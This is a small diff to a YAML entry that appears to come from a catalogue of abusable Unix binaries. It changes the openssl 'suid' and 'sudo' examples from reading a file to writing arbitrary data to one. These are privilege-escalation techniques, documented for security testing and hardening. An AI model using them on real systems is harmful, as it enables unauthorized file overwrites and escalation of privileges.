@@ -15,10 +15,10 @@ functions:
         openssl enc -in "$LFILE"
   suid:
     - code: |
-        LFILE=file_to_read
-        openssl enc -in "$LFILE"
+        LFILE=file_to_write
+        echo DATA | openssl enc -out "$LFILE"
   sudo:
     - code: |
-        LFILE=file_to_read
-        sudo openssl enc -in "$LFILE"
+        LFILE=file_to_write
+        echo DATA | sudo openssl enc -out "$LFILE"
 ---
